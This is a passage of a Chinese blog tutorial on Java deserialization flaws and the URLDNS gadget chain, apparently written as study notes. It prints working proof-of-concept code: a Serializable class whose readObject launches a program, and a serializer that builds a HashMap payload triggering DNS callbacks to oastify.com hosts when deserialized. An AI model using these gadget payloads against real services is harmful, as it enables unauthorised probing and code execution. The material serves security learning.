+<p>所以从根本上来说，Java 反序列化的漏洞的与 <code>readObject</code> 有关。</p>
+</blockquote>
+<h2 id="3-2-可能存在安全漏洞的形式"><a href="#3-2-可能存在安全漏洞的形式" class="headerlink" title="3.2 可能存在安全漏洞的形式"></a>3.2 可能存在安全漏洞的形式</h2><ol>
+<li>入口类的 <code>readObject</code> 直接调用危险方法</li>
+</ol>
+<ul>
+<li>这种情况呢，在实际开发场景中并不是特别常见，我们还是跟着代码来走一遍，写一段弹计算器的代码，文件 ——— “<strong>Person.Java</strong>”（定义自定义的readObject函数）</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.serialize;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.serialize.person.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:49</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        ois.defaultReadObject();<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>自定义readObject函数在入口类中————运行序列化程序serialize.java————运行反序列化程序unserialize.java————计算器弹窗</p>
+<ol start="2">
+<li><p>入口参数中包含可控类，该类有危险方法<code>readObject</code> 时调用</p>
+</li>
+<li><p>入口类参数中包含可控类，该类又调用其他有危险方法的类readObject时调用</p>
+</li>
+<li><p>构造函数&#x2F;静态代码块等类加载时隐式执行</p>
+</li>
+</ol>
+<h1 id="四、反序列化漏洞攻击思路"><a href="#四、反序列化漏洞攻击思路" class="headerlink" title="四、反序列化漏洞攻击思路"></a>四、反序列化漏洞攻击思路</h1><ul>
+<li>攻击前提：实现Serializable（implement Serializable）</li>
+</ul>
+<p>基本思路：</p>
+<ol>
+<li>入口类：source （重写 readObject 调用常见的函数；参数类型宽泛，比如可以传入一个Object作为参数；最好 jdk 自带）</li>
+<li>找到入口类之后要找调用链 gadget chain 相同名称、相同类型</li>
+<li>执行类 sink （RCE SSRF 写文件等等）比如 <code>exec</code> 这种函数</li>
+</ol>
+<h2 id="4-1-HashMap举例说明如何找到入门类"><a href="#4-1-HashMap举例说明如何找到入门类" class="headerlink" title="4.1 HashMap举例说明如何找到入门类"></a>4.1 HashMap举例说明如何找到入门类</h2><ul>
+<li>攻击前提：实现Serializable（implement Serializable）</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272207377.png" srcset="/img/loading.gif" lazyload alt="image-20240727220725322"></p>
+<p>首先，来到HashMap重写的<code>readObject函数</code>中寻找执行<code>readObject</code>操作的地方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272232143.png" srcset="/img/loading.gif" lazyload alt="image-20240727223224068"></p>
+<p>可以发现HashMap传入的参数<code>key</code>和<code>value</code>进行了<code>readObject</code>操作，随后再将key变量进行<code>hash</code>操作；跟入~</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272234646.png" srcset="/img/loading.gif" lazyload alt="image-20240727223434596"></p>
+<p>发现，当key值不为空null时，会调用key的hashCode()方法；同时，我们可以发现key的类型为Object，满足我们 调用常见的函数 这一条件。</p>
+<h2 id="4-2-URLDNS实战"><a href="#4-2-URLDNS实战" class="headerlink" title="4.2 URLDNS实战"></a>4.2 URLDNS实战</h2><blockquote>
+<p>根据Drunkbaby所说，URLDNS利用链到底能不能称之为利用链的探讨，其实我并不关心，因为我听不懂！重点放在理解内容上</p>
+</blockquote>
+<p>URL利用链的优点如下，非常适合我们用于检测反序列化漏洞：</p>
+<ol>
+<li>使⽤ Java 内置的类构造，对第三⽅库没有依赖。</li>
+<li>在⽬标没有回显的时候，能够通过 DNS 请求得知是否存在反序列化漏洞 URL 类，调用 <code>openConnection</code> 方法，到此处的时候，其实 <code>openConnection</code> 不是常见函数，就已经难以利用了。</li>
+</ol>
+<p>查看ysoserial 项目的URLDNS链</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *   Gadget Chain:</span><br><span class="hljs-comment"> *     HashMap.readObject()</span><br><span class="hljs-comment"> *       HashMap.putVal()</span><br><span class="hljs-comment"> *         HashMap.hash()</span><br><span class="hljs-comment"> *           URL.hashCode()</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>反复观看师傅的博客终于看明白了！</p>
+<p>利用链中的URL.hashCode()中的URL怎么来的？我们经过上述的分析可以知道，URL应该是<key>，那么就是HashMap&lt;key, value&gt;中的键。如何得到，那么就是创建一个HashMap&lt;URL, Integer&gt;，然后调用HahsMap中的put函数将特定的键值输入其中。</p>
+</blockquote>
+<p>我们来到HashMap中的<code>put</code>函数，可以看到put函数调用了<code>hash</code>函数，<code>hash</code>函数则是调用了<code>hashcode</code>函数。</p>
+<p>那么现在我们来研究一下<code>URL</code>类中的<code>hashcode</code>函数，可以看到是<code>handler</code>调用了<code>hashCode</code>函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272309684.png" srcset="/img/loading.gif" lazyload alt="image-20240727230913616"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272310836.png" srcset="/img/loading.gif" lazyload alt="image-20240727231053778"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272311383.png" srcset="/img/loading.gif" lazyload alt="image-20240727231139313"></p>
+<p>一步步跟入可以发现其调用了<code>getHostAddress(u)</code>其中<code>u</code>为传入的参数；再继续跟入就到了师傅所说的<code>InetAddress.getByName(host)</code>了，作⽤是根据主机名，获取其 IP 地址，在⽹络上其实就是⼀次 DNS 查询。到这⾥就不必要再跟了。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272312890.png" srcset="/img/loading.gif" lazyload alt="image-20240727231251824"></p>
+<p>确实，到这里思路就已经非常清晰了，大概可以知道这个利用链如何实现的啦！</p>
+<ol>
+<li>HashMap-&gt;readObject()</li>
+<li>HashMap-&gt;hash()</li>
+<li>URL-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;hashCode()</li>
+<li>URLStreamHandler-&gt;getHostAddress()</li>
+<li>InetAddress-&gt;getByName()</li>
+</ol>
+<p>以下是复现师傅的“程咬金”，理解即可！<a target="_blank" rel="noopener" href="https://drun1baby.top/2022/05/17/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-01-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%A6%82%E5%BF%B5%E4%B8%8E%E5%88%A9%E7%94%A8/#URLDNS-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E7%9A%84-POC">详细参考</a>（本人写得非常简化，所以还是参考师傅本人的吧，确实有点懒了）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://3dhr3wop8l59k8qfhew3ddvuklqee42t.oastify.com&quot;</span>);<br>        HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashmap.put(url, <span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272331296.png" srcset="/img/loading.gif" lazyload alt="image-20240727233102240"></p>
+<p>由于URL类中的<code>hashCode</code>变量的值默认是-1，所以会默认调用URL的<code>hashCode</code>函数导致执行<code>getByName()</code>函数从而产生DNS请求，所以需要通过反射机制修改<code>hashCode</code>变量的默认值-1，使其序列化时不会调用<code>hashCode</code>函数。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272334790.png" srcset="/img/loading.gif" lazyload alt="image-20240727233410740"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202407272354425.png" srcset="/img/loading.gif" lazyload alt="image-20240727233345600"></p>
+<p>以下是修改后的序列化函数，此时在序列化时就不会产生DNS请求啦。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.serialize;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.serialize.serializationTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:51</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">serializationTest</span> &#123;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-number">22</span>);<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://ztwnjs4lohl5046bxaczt9bq0h6bu2ir.oastify.com&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashCode.setAccessible(<span class="hljs-literal">true</span>);<br>        hashCode.set(url, <span class="hljs-number">1234</span>);    <span class="hljs-comment">// 设置url变量中的hashCode变量值为1234</span><br>        HashMap&lt;URL, Integer&gt; hashmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashmap.put(url, <span class="hljs-number">1</span>);<br>        hashCode.set(url, -<span class="hljs-number">1</span>);<br>        serialize(hashmap);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.mango.unserialize;<br><br><span class="hljs-keyword">import</span> com.mango.serialize.Person;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Project</span> unSerialize</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@File</span> com.mango.unserialize.unserializeTest.java</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> mango</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2024/7/27 15:55</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Description</span></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">unserializeTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        HashMap&lt;URL, Integer&gt; unserialize = (HashMap&lt;URL, Integer&gt;) unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<h1 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h1><ol>
+<li><p>谢谢Drunkbaby师傅，收获良多！写得真的非常好</p>
+</li>
+<li><p>反序列化漏洞利用的条件是必须实现Serializable</p>
+</li>
+<li><p>漏洞利用的基本思路与反序列化利用链挖掘思路</p>
+<blockquote>
+<p>以下是个人的一点小小理解：（每个人理解可能都不一样）</p>
+<ol>
+<li>找到入口类（寻找实现Serializable的类），然后分析其重写readObject函数，查看其调用的常见函数（最好是参数类型是Object或者其他宽泛的类型），最好该函数jdk自带</li>
+<li>寻找类中存在相同常见函数的类，并且该函数调用了一些可利用的函数例如<code>exec</code>等等</li>
+<li>在构思传入指定数值类型的参数进行序列化后以指定类调用该常见函数，从而执行该类中常见函数中存在的危险函数</li>
+</ol>
+<p>个人理解的本质就是找寻不同类中同名函数是否存在危险函数，从而对危险函数的利用。</p>
+</blockquote>
+</li>
+</ol>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Java%E5%AE%89%E5%85%A8/" class="category-chain-item">Java安全</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java%E5%AE%89%E5%85%A8/" class="print-no-link">#Java安全</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+        <a href="/tags/%E5%88%A9%E7%94%A8%E9%93%BE/" class="print-no-link">#利用链</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java反序列化基础概念与URLDNS利用</div>
+      <div>http://candyb0x.github.io/2024/07/27/Java反序列化基础概念与URLDNS利用/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Candy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月27日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年8月17日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/30/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJava%E5%8F%8D%E5%B0%84/" title="Java反序列化之Java反射与URLDNS链分析">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java反序列化之Java反射与URLDNS链分析</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/26/CVE-2021-44228-Apache-Log4j2-JNDI%E6%B3%A8%E5%85%A5-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="(CVE-2021-44228)Apache-Log4j2-JNDI注入-远程代码执行漏洞">
+                        <span class="hidden-mobile">(CVE-2021-44228)Apache-Log4j2-JNDI注入-远程代码执行漏洞</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Candy</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
